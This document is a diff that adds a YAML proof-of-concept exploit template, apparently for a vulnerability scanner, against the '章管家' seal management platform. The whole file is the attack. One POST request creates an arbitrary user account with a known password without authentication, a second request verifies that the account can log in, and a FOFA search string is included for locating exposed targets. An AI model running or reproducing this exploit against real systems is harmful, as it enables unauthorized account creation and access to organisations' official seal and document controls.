@@ -1,0 +1,24 @@
+id: poc-yaml-shjysoft-zhangin-saveuser-any
+info:
+  name: 章管家 saveuser接口任意用户添加
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 印章智慧管理平台
+  fofa: app="章管家-印章智慧管理平台"
+requests:
+- method: POST
+  path: /api/personSeal_jdy/saveUser.htm
+  headers:
+    Content-Type: application/json
+  data: '{"op":{},"data":{"mobile":"13333333333","uid":"13333333333","password":"123456","name":"testuser","return_url":"https://www.baidu.com","apisecretkey":"1","_id":"1","mail_address":"111@qq.com"},"b7o4ntosbfp":"="}'
+  expression: "status_code == 200 && \nbody == \"{\\\"code\\\":200}\"\n"
+- method: POST
+  path: /web/checkPhoneAndPwd.htm
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+  data: param=%2C49%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C60%2C62%2C60%2C62%2C49%2C50%2C51%2C52%2C53%2C54
+  expression: "status_code == 200 && \nbody == \"188808880\"\n"
+variables: {}
+transport: http
